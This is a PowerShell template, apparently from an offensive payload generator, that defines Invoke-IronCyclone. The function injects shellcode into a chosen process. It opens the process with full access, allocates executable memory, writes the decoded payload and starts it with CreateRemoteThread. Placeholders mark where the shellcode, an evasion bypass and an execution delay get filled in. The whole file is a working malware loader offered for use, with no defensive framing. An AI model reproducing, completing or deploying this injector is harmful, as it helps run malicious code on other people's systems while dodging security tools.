####CODE####

function Invoke-IronCyclone(){
    $Win32 = @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll")]
        public static extern Boolean WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            out IntPtr lpThreadId
        );

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
            Int32 processAccess,
            bool bInheritHandle,
            int processId
        );

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        public static extern void CloseHandle(
            IntPtr handle
        );
    }
"@
    Add-Type $Win32

    [Int32] $targetpid = $PID
    if($args.length -gt 0){
        [Int32]::TryParse($args[0], [ref] $targetpid)
        if ($targetpid -lt 0)
        {
            Write-Host "[-] Error: Process not found"
            exit
        }
    } else {
        ####FIND_PROCESS####
    }


    $encoded = <####SHELLCODE####>

    ####CALL####
    $size = $decoded.Length

    $pHandle = [Win32]::OpenProcess(0x001F0FFF, $false, $targetpid)
    if ($pHandle -eq [IntPtr]::Zero){
        Write-Host "[-] Couldn't get an handle to the process"
        exit
    }

    [IntPtr] $addr = [Win32]::VirtualAllocEx($pHandle, 0, $size, 0x3000, 0x40);
    if ($addr -eq [IntPtr]::Zero){
        Write-Host "[-] Couldn't allocate memory"
        exit
    }
    [UIntPtr] $nBytesWritten = [UIntPtr]::Zero
    [Win32]::WriteProcessMemory($pHandle, $addr, $decoded, $size, [ref] $nBytesWritten)
    if ($nBytesWritten -eq [UIntPtr]::Zero){
        Write-Host "[-] Couldn't write to process memory"
        exit
    }
    [IntPtr] $threadId = [IntPtr]::Zero
    [IntPtr] $thandle = [Win32]::CreateRemoteThread($pHandle, 0, 0, $addr, 0, 0, [ref] $threadId);
    if ($thandle -eq [IntPtr]::Zero){
        Write-Host "[-] Couldn't start remote thread"
        exit
    }
    [Win32]::CloseHandle($thandle)
}

####DELAY####

####BYPASS####

Invoke-IronCyclone